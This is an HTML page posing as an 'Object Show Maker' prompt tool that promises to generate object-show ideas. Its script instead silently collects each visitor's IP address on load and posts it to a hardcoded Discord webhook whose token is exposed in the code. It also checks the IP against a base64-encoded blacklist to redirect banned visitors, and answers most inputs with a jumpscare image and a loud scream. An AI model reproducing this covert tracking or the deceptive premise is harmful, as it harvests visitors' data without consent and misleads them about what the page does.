<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>The Object Show Maker Program</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      color: #333;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    #creepy-screen, #help-screen, #morse-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    #creepy-screen {
      background: #220000;
    }
    #help-screen {
      background: #111;
    }
    #morse-screen {
      background: black;
      color: white;
      font-size: 2rem;
      font-family: monospace;
    }
    #creepy-screen img, #help-screen img {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
    }
    input[type="text"] {
      padding: 10px;
      font-size: 1em;
      width: 300px;
      margin-top: 10px;
    }
    button {
      padding: 10px 15px;
      font-size: 1em;
      cursor: pointer;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>The Object Show Maker Program</h1>
  <p>
    Hello! And welcome to the object show maker program, here you can put in your prompt detailing and talking about your object show idea, and TSM should make it a real astonishing masterpiece!
  </p>
  <input type="text" id="user-input" placeholder="Enter your text..." />
  <button id="submit-button">Submit</button>

  <div id="creepy-screen">
    <img src="https://raw.githubusercontent.com/FilenFolder/TSM/main/LEAVE.webp" alt="Creepy Screen">
  </div>

  <div id="help-screen">
    <img src="https://raw.githubusercontent.com/FilenFolder/TSM/main/HELP.webp" alt="Help Screen">
  </div>

  <div id="morse-screen">
    <span id="morse-text"></span>
  </div>

  <audio id="scream-sound" src="https://raw.githubusercontent.com/FilenFolder/TSM/main/LOUD.mp3.flac" type="audio/flac"></audio>
  <audio id="morse-sound" src="https://raw.githubusercontent.com/FilenFolder/TSM/main/morse.wav" type="audio/wav"></audio>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1378330564041511024/31r5mXGGMzHS1Hcwq9ICnTZI-jn6LcmC5fq_F8YWTXU-Co4JAtZix-M-AOX6TxiIAY2W';
    const BLACKLIST_URL = 'https://raw.githubusercontent.com/FilenFolder/TSM/main/blacklist.txt';

    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        if (!res.ok) throw new Error('Failed to get IP');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        console.error('IP fetch error:', e);
        return null;
      }
    }

    async function sendIPToDiscord(ip) {
      if (!ip) return;
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `New visitor IP: ${ip}`
          })
        });
      } catch (e) {
        console.error('Discord webhook error:', e);
      }
    }

    async function getBlacklist() {
      try {
        const res = await fetch(BLACKLIST_URL);
        if (!res.ok) throw new Error('Blacklist fetch failed');
        const text = await res.text();
        // Each line is base64 encoded IP, decode them
        return text
          .split('\n')
          .map(line => line.trim())
          .filter(line => line)
          .map(encoded => {
            try {
              return atob(encoded);
            } catch {
              return null; // skip invalid lines
            }
          })
          .filter(ip => ip);
      } catch (e) {
        console.error('Blacklist error:', e);
        return [];
      }
    }

    async function checkBan() {
      const userIP = await getIP();
      if (!userIP) return;

      // Send IP to Discord webhook
      sendIPToDiscord(userIP);

      const blacklist = await getBlacklist();
      if (blacklist.includes(userIP)) {
        window.location.href = 'https://filenfolder.github.io/TSM/banned.html';
      }
    }

    checkBan();

    document.getElementById("submit-button").addEventListener("click", function triggerEffect() {
      const input = document.getElementById("user-input").value.trim().toLowerCase();
      const creepyScreen = document.getElementById("creepy-screen");
      const helpScreen = document.getElementById("help-screen");
      const morseScreen = document.getElementById("morse-screen");
      const morseText = document.getElementById("morse-text");

      const screamSound = document.getElementById("scream-sound");
      const morseSound = document.getElementById("morse-sound");

      if (input === "help") {
        helpScreen.style.display = "flex";
        setTimeout(() => {
          helpScreen.style.display = "none";
          document.getElementById("user-input").value = "";
        }, 2500);
        return;
      }

      if (input === "won't") {
        morseText.textContent = "";
        morseScreen.style.display = "flex";
        morseSound.currentTime = 0;
        morseSound.play();
        morseSound.onended = () => {
          morseScreen.style.display = "none";
          document.getElementById("user-input").value = "";
        };
        return;
      }

      if (input === "demons of hell") {
        window.location.href = "https://youtube.com/playlist?list=PLtRVKRD2kdqKfgvhmIQ4KbWTo9aHxrLO6&feature=shared";
        return;
      }

      if (input === "75 486 675 552") {
        morseText.textContent = "inkspotdoyouknowthem";
        morseScreen.style.display = "flex";
        setTimeout(() => {
          morseScreen.style.display = "none";
          morseText.textContent = "";
          document.getElementById("user-input").value = "";
        }, 5000);
        return;
      }

      creepyScreen.style.display = "flex";
      screamSound.currentTime = 0;
      screamSound.play();

      setTimeout(() => {
        creepyScreen.style.display = "none";
        screamSound.pause();
        screamSound.currentTime = 0;
        document.getElementById("user-input").value = "";
      }, 2500);
    });
  </script>
</body>
</html>
